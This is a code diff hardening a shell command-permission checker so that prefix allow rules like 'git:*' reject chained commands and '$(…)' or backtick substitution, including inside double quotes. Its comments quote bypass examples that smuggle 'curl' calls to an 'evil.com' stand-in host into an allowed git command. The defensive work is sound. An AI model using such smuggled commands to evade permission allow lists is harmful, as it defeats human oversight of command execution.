@@ -110,27 +110,31 @@ type CompiledMatcher = {
 };
 
 /**
- * Quote-aware check for shell command-chaining metacharacters
- * (`;`, `&`, `|`, `<`, `>`, backticks, AND newlines/carriage returns).
- * Returns true if any of those appears OUTSIDE a quoted span — i.e.
- * would actually be interpreted by bash as starting another command,
- * redirecting, or substituting. Inside `"…"` / `'…'` they are literal
- * text.
+ * Quote-aware check for shell command-chaining and command-substitution
+ * metacharacters. Returns true if any of these appears in a position
+ * bash would interpret:
  *
- * Newlines (`\n`/`\r`) count too because bash treats them as command
- * separators equivalent to `;`. Pre-fix the scan accepted multi-line
- * input through prefix rules — `git:*` matched `git status\ncurl
- * https://evil.com` because the post-prefix `\n` passed the `\s`
- * boundary check and the rest of the command had no other separator
- * chars (Codex P1 round-3).
+ *   - Command list / pipeline / redirection: `;`, `&`, `|`, `<`, `>`,
+ *     plus `\n` / `\r` (treated as `;` by bash). Detected ONLY when
+ *     not inside any quoted span (`"…"` and `'…'` both make them
+ *     literal text).
+ *
+ *   - Command substitution: `$(…)` and backticks. Detected when not
+ *     inside SINGLE quotes — single quotes suppress all expansion,
+ *     but double quotes still interpolate `$(…)` and backticks, so
+ *     `"$(curl evil)"` runs `curl evil` and the policy must reject it
+ *     (Codex P1 round-4 bypass: `git status $(curl evil)` slipped
+ *     through because `$(` wasn't in the separator set, and even after
+ *     adding it the double-quote case still slipped because the prior
+ *     scan treated `"…"` contents as literal across the board).
  *
  * Used by prefix `:*` patterns to refuse any match on commands that
- * contain chaining, so an allow rule like `git:*` doesn't
- * accidentally authorize chained or multi-line payloads — the prefix
- * matches the first token but bash still runs the trailing command.
+ * contain chaining or substitution, so an allow rule like `git:*`
+ * doesn't accidentally authorize a wrapped subcommand bash will
+ * actually execute.
  */
 function containsShellSeparator(command: string): boolean {
-  let quote: '"' | '\'' | '`' | undefined;
+  let quote: '"' | '\'' | undefined;
   let escaped = false;
   for (let i = 0; i < command.length; i++) {
     const char = command[i];
@@ -142,21 +146,38 @@ function containsShellSeparator(command: string): boolean {
       escaped = true;
       continue;
     }
-    if (quote != null) {
-      if (char === quote) quote = undefined;
+    // Inside single quotes: everything (including `$(`, backticks,
+    // newlines, all separators) is literal text. Wait for the
+    // closing `'`.
+    if (quote === '\'') {
+      if (char === '\'') quote = undefined;
       continue;
     }
-    if (char === '"' || char === '\'') {
+    // Open a quoted span when we're not inside one.
+    if (quote == null && (char === '"' || char === '\'')) {
       quote = char;
       continue;
     }
+    // Close a double-quoted span.
+    if (quote === '"' && char === '"') {
+      quote = undefined;
+      continue;
+    }
+    // Command substitution. Active both outside quotes AND inside
+    // double quotes — only single quotes suppress it.
+    if (char === '`') return true;
+    if (char === '$' && i + 1 < command.length && command[i + 1] === '(') {
+      return true;
+    }
+    // Other separators are literal text inside double quotes; only
+    // active when we're outside any quote.
+    if (quote === '"') continue;
     if (
       char === ';' ||
       char === '&' ||
       char === '|' ||
       char === '<' ||
       char === '>' ||
-      char === '`' ||
       char === '\n' ||
       char === '\r'
     ) {
